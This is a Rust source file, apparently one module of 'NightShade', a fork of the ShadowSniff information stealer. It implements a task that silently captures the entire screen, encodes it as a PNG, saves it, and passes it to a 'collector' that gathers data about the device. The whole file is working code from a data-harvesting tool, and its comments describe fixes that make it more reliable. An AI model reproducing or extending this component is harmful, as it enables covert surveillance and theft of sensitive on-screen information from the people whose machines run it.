/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use alloc::vec;
use alloc::vec::Vec;
use core::iter::once;
use core::mem::zeroed;
use core::ptr::null_mut;
use filesystem::path::Path;
use miniz_oxide::deflate::compress_to_vec_zlib;
use tasks::{Task, parent_name};
use utils::crc32::crc32;

use collector::{Collector, Device};
use filesystem::{FileSystem, WriteTo};
use windows_sys::Win32::Graphics::Gdi::{
    BI_RGB, BITMAPINFO, BITMAPINFOHEADER, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC,
    CreateDCW, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDIBits, SRCCOPY, SelectObject,
};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN, SM_YVIRTUALSCREEN,
};

pub struct ScreenshotTask;

impl<C: Collector, F: FileSystem> Task<C, F> for ScreenshotTask {
    parent_name!("Screenshot.png");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Ok((width, height, pixels)) = capture_screen() else {
            return;
        };

        let png = create_png(width as u32, height as u32, &pixels);
        let _ = &png.write_to(filesystem, parent);

        collector.get_device().set_screenshot(png);
    }
}

fn capture_screen() -> Result<(i32, i32, Vec<u8>), ()> {
    let (x, y, width, height) = unsafe {
        (
            GetSystemMetrics(SM_XVIRTUALSCREEN),
            GetSystemMetrics(SM_YVIRTUALSCREEN),
            GetSystemMetrics(SM_CXVIRTUALSCREEN),
            GetSystemMetrics(SM_CYVIRTUALSCREEN),
        )
    };

    // Headless / locked sessions can report a zero-sized virtual screen; a
    // negative or zero size used to flow into a bogus (possibly huge) buffer
    // allocation.
    if width <= 0 || height <= 0 {
        return Err(());
    }

    let hdc = unsafe {
        CreateDCW(
            "DISPLAY"
                .encode_utf16()
                .chain(once(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
        )
    };

    if hdc.is_null() {
        return Err(());
    }

    let hdc_mem = unsafe { CreateCompatibleDC(hdc) };
    if hdc_mem.is_null() {
        unsafe { DeleteDC(hdc) };
        return Err(());
    }

    let hbitmap = unsafe { CreateCompatibleBitmap(hdc, width, height) };
    if hbitmap.is_null() {
        unsafe {
            DeleteDC(hdc_mem);
            DeleteDC(hdc);
        }
        return Err(());
    }

    let _old = unsafe { SelectObject(hdc_mem, hbitmap as *mut _) };

    unsafe {
        BitBlt(hdc_mem, 0, 0, width, height, hdc, x, y, SRCCOPY);
    }

    let mut bmi: BITMAPINFO = unsafe { zeroed() };
    bmi.bmiHeader.biSize = size_of::<BITMAPINFOHEADER>() as _;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    let mut pixels = vec![0u8; (width * height * 4) as usize];
    let result = unsafe {
        GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut _ as *mut _,
            DIB_RGB_COLORS,
        )
    };

    unsafe {
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        // The screen DC was never released before — one GDI DC leaked per run.
        DeleteDC(hdc);
    }

    if result == 0 {
        return Err(());
    }

    let rgb_pixels: Vec<u8> = pixels
        .chunks_exact(4)
        .flat_map(|p| [p[2], p[1], p[0]])
        .collect();

    Ok((width, height, rgb_pixels))
}

fn create_png(width: u32, height: u32, pixels: &[u8]) -> Vec<u8> {
    let mut png = Vec::new();

    png.extend(b"\x89PNG\r\n\x1A\n");

    let mut ihdr = Vec::new();
    ihdr.extend(width.to_be_bytes());
    ihdr.extend(height.to_be_bytes());
    ihdr.extend([8, 2, 0, 0, 0]);
    append_chunk(&mut png, b"IHDR", &ihdr);

    let scanlines: Vec<u8> = pixels
        .chunks((width * 3) as usize)
        .flat_map(|row| [0x00].into_iter().chain(row.iter().copied()))
        .collect();

    let compressed = compress_to_vec_zlib(&scanlines, 6);
    append_chunk(&mut png, b"IDAT", &compressed);

    append_chunk(&mut png, b"IEND", &[]);

    png
}

fn append_chunk(png: &mut Vec<u8>, chunk_type: &[u8; 4], data: &[u8]) {
    let mut chunk_bytes = Vec::new();
    chunk_bytes.extend_from_slice(chunk_type);
    chunk_bytes.extend_from_slice(data);

    let crc = crc32(&chunk_bytes);

    png.extend(&(data.len() as u32).to_be_bytes());
    png.extend_from_slice(chunk_type);
    png.extend_from_slice(data);
    png.extend(&crc.to_be_bytes());
}
